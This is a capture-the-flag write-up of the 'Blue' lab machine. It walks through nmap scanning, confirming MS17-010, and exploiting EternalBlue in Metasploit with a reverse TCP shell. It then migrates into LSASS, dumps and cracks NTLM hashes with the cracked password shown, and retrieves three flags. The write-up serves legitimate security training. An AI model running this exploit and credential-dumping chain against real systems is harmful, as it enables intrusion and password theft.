# Blue

## Machine info





## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.253.11 -oN port_scan.txt

Nmap scan report for 10.10.253.11
Host is up (0.036s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-07-28T14:22:00
|_Not valid after:  2026-01-27T14:22:00
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2025-07-29T14:23:34+00:00
|_ssl-date: 2025-07-29T14:23:40+00:00; -2s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-29T14:23:34
|_  start_date: 2025-07-29T14:21:58
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-29T09:23:34-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 59m57s, deviation: 2h14m09s, median: -2s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:18:ab:86:6d:ff (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```



## SMB vuln enumeration

```bash
nmap -p 445 --script vuln 10.10.253.11

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
```

The host is vulnerable to ms17-010 vulnerability called EternalBlue.



## EternalBlue with Metasploit

Start metasploit and search the modules for thid vulnerability.

```bash
service postgresql start && msfconsole

search ms17-010
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the first module which we found.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Set the confs and run the exploit

```bash
set RHOSTS 10.10.253.11
set payload windows/x64/shell/reverse_tcp
exploit
```

The exploit was success!

Now we can upgrade our shell into meterpreter shell

```
session -u 1
```

Then, that we have a meterpreter session go to PrivEsc part



## PrivEsc

We are already NT AUTHORITY/SYSTEM but we can migrate our process to obtain all rights.

```bash
ps
migrate LSASS_PID
```

Now we can use the HASHDUMP module of meterpreter to dump all hash in the machine.

```
hashdump

# output 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Copy the jon row into a file and try to crack it with John the ripper.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=NT

# output
alqfna22         (Jon)  
```



## Flags

Flag1? _This flag can be found at the system root._&#x20;

```powershell
cd C:\
more flag1.txt
```



Flag2? _This flag can be found at the location where passwords are stored within Windows._

```powershell
cd C:\Windows\System32\config
more flag2.txt
```



flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._&#x20;

```powershell
cd C:\Users\Jon\Documents
more flag3.txt
```
